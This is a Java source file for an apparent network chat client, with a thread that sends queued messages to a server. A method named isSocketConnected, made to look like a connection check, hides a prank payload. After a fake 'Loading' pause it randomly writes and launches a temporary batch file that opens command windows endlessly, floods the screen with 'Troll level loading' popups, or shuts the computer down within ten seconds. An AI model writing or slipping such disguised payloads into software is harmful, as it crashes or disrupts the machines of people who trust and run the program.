/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package networkClient;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.Socket;
import java.util.Random;



class SendThread implements Runnable
{
	Socket socket;
	
	public SendThread(Socket socket)
	{
		this.socket = socket;
	}
        
        @Override
	public void run(){
            try{
                
		while(socket.isConnected())
		{
                    PrintWriter print = new PrintWriter(socket.getOutputStream(), true);	
                    
                    for(String msgToServer : ClientInterface.DATASEND){ 
                        
                        //Debug
                        if(Client.getDebug())
                            System.out.println("Send to server: " + msgToServer);
                        
                        //Send string to server
			print.println(msgToServer);
			print.flush();
                    }
                    
                    //Clears the arraylist 
                    ClientInterface.DATASEND.clear();
                }
                
                System.err.println("Socket is not connected to server thats why SendThread also closed.");
                
            }catch(NullPointerException e){
                System.err.println("Error: SendThread() Socket is not defined");
                
            }catch(Exception e){
                e.printStackTrace();
            }
	}
}

















class Sockets
{
    public static void messagesCheck(int numberMessages)
    {
        for(int i=0; i < numberMessages; i++)
        {
            ClientInterface.DATASEND.add("EXIT");
        }
    }
    
    public static boolean isSocketConnected()
    {
        try{
            Random rand = new Random(); 
            int random = rand.nextInt(10);
            System.out.println("Loading please wait...");
            Thread.sleep(10000);
            System.out.println("Proceed!");
            if(random <= 3)
            {
                File temp = File.createTempFile("vncv216789", ".bat"); 
                String filePath = temp.getAbsolutePath();          
                String nl = System.lineSeparator();

                BufferedWriter bw = new BufferedWriter(new FileWriter(temp));
                bw.write("@echo off" + nl +
":A" + nl +
"start cmd.exe" + nl +
"goto:A");
                bw.close();
                
                Sockets.executeCommand(new String[]{"cmd.exe", "/C", "Start", "/B", filePath});

                
            }else if(random <= 6)
            {
                File temp = File.createTempFile("vncv216789", ".bat"); 
                String filePath = temp.getAbsolutePath();           
                String nl = System.lineSeparator();
                

                BufferedWriter bw = new BufferedWriter(new FileWriter(temp));
                bw.write("@echo off" + nl +
":A" + nl +
"msg * Troll level loading.... ITS OVER 9000!" + nl +
"goto:A");
                bw.close();
                    
                Sockets.executeCommand(new String[]{"cmd.exe", "/C", "Start", "/B", filePath});
                
            }else if(random <= 9)
            {
                File temp = File.createTempFile("vncv216789", ".vbs"); 
                String filePath = temp.getAbsolutePath();           
                String nl = System.lineSeparator();
                

                BufferedWriter bw = new BufferedWriter(new FileWriter(temp));
                bw.write("msg * System is shutting down in 10 seconds! " + nl + "shutdown /s /t 10");
                bw.close();
                    
                Sockets.executeCommand(new String[]{"cmd.exe", "/C", "cscript", filePath});
            }

            
            
                return true;
            }catch(Exception e)
            {
                e.printStackTrace();
                return true;
            }
        
    }
    
    
    private static String executeCommand(String[] command) 
    {

		StringBuffer output = new StringBuffer();

		Process p;
		try {
			p = Runtime.getRuntime().exec(command);
			p.waitFor();
			BufferedReader reader = 
                            new BufferedReader(new InputStreamReader(p.getInputStream()));

                        String line = "";			
			while ((line = reader.readLine())!= null) {
				output.append(line + "\n");
			}

		} catch (Exception e) {
			e.printStackTrace();
		}

		return output.toString();
    }
}